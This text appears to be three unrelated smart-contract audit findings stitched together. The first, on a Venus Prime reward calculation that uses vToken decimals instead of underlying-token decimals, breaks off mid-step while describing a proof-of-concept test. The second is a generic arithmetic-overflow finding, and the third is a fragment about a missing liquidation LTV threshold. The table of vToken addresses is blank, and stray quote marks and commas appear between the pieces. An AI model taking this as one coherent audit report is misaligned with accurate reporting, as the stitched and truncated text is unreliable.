After that `capital` is used in `Scores.calculateScore` function.\nNote: `capital` precision from  function is in precision of **underlying token decimals**.\n\n\n\n```solidity\n    (uint256 capital, , ) = _capitalForScore(xvsBalanceForScore, borrow, supply, market);\n    capital = capital * (10 ** (18 - vToken.decimals()));\n\n    return Scores.calculateScore(xvsBalanceForScore, capital, alphaNumerator, alphaDenominator);\n```\n\nThe mistake is made when `vToken.decimals()` is used instead of `vToken.underlying().decimals()`.\n&nbsp;\n\nTo prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:\n\n| vToken                                                                        | vToken decimals | Underlying token decimals |\n| ----------------------------------------------------------------------------- | --------------- | ------------------------- |\n|  | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|   | 8               | 18                        |\n|  | 8               | 18                        |\n\nSince `vToken.decimals()` is used, this means the precision of `capital` is `18 + (18 - 8) = 28` decimals instead of 18 decimals, which makes the `score` calculation from  function incorrect, since the function expects `capital` to be in precision of 18 decimals.\n\nAs a result, `delta` for market's `rewardIndex` is incorrectly calculated and it can be 0 even though it shouldn't be, which means that users will not accrue any rewards.\n\n### Test\n\n#### 1. Update current test with correct decimals for vTokens\n\nDevelopers have made a mistake when writing the tests for `Prime.sol` - in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.\n\nIf the decimal value of vToken is set to 8 in the tests, then the tests will fail.\n\nChange the `vusdt`, `veth` and `vbnb` decimals to 8 and run:\n\n```bash\nnpx hardhat test tests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts\n```\n\nThis will make the current tests fail.\n\n#### 2. PoC test\n\nHere is a test where it shows, that `rewardIndex` is still 0 after `Prime.accrueInterest` is called, even though it should be > 0.\n\n<details>\n<summary>PoC test</summary>\n\nTo run the following test:\n\n1. Create `PoC.ts` file under the `tests/hardhat/Prime` path.\n2. Copy the code below and paste it into the `PoC.ts` file.\n3.

This scenario will cause an arithmetic overflow, causing the smart contract to revert the transaction or produce incorrect calculations.\n\nThe vulnerability arises from the multiplication of `xvs` and `markets[market].borrowMultiplier`, which can result in a large value that exceeds the maximum capacity of the variable type designed to store the result. Similarly, the multiplication of `tokenPrice` and `supply` or `borrow` also has the potential to overflow if the input variables are very high (e.g., factors with many decimal places).\n\nTo prevent this vulnerability, developers should utilize safe math operations that revert the transaction if an overflow would occur, reduce precision factors used in computations or perform the multiplication in steps checking for possible overflows at each stage, and consider the appropriate scaling of input variables to ensure that intermediate results remain within safe bounds for the data types used.",

This does not provide adequate room for collateral and token price fluctuations, preventing users from adding more collateral or reducing debt before facing liquidation.\n\nTo mitigate this vulnerability, a liquidation LTV that is larger than the maximal borrow LTV should be added, ensuring that positions can only be liquidated after reaching the liquidation LTV threshold.
